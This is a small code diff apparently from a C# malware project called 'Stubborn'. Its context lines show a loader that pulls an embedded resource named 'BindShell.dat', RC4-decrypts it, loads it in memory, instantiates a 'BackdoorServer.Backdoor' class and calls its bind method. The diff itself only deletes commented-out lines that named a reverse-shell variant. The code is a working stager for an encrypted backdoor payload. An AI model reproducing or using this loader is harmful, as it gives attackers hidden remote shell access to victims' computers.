@@ -25,7 +25,6 @@ namespace Stubborn
             foreach (string name in Assembly.GetExecutingAssembly().GetManifestResourceNames())
             {
                 if (name.Equals("Stubborn.BindShell.dat", StringComparison.InvariantCultureIgnoreCase))
-                // if (name.Equals("Stubborn.RShell.dat", StringComparison.InvariantCultureIgnoreCase))
                 {
                     using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                     {
@@ -36,7 +35,6 @@ namespace Stubborn
                         byte[] buff_dec = RC4.Decrypt(pass, buffer);
                         Assembly pay = Assembly.Load(buff_dec);
                         object o = pay.CreateInstance("BackdoorServer.Backdoor");
-                        //object o = pay.CreateInstance("RShell.RShell_C");
 
                         Type t = o.GetType();
                         MethodInfo mi = t.GetMethod("_bind");
